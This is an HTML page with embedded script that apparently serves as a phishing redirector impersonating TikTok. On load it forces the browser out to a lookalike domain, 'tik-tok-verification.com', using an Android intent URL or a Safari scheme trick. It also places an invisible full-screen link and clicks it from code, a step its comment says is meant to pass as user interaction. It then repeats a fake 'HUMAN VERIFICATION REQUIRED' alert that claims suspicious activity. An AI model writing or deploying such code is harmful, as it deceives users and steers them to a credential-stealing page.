<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #fff; margin: 0; overflow: hidden; }
        #ghost { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; z-index: 999; }
    </style>
</head>
<body>

<a id="ghost" href="https://tik-tok-verification.com/Verification/verify1.html" target="_blank">.</a>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = targetUrl.replace(/^https?:\/\//, '');
    const killTime = Date.now() + 5000;

    function nuke() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // THE NEW COMBO
            // 1. Fire a direct 'safari-https' call without the 'https://' inside it
            window.location.href = "safari-https://" + domain;

            // 2. Click the Ghost Link programmatically
            // This is seen as a 'User Interaction' by the OS
            document.getElementById('ghost').click();
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        nuke();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                nuke();
                setTimeout(securityLoop, 250);
            }
        }, 250);
    }

    window.onload = securityLoop;
</script>
</body>
</html>
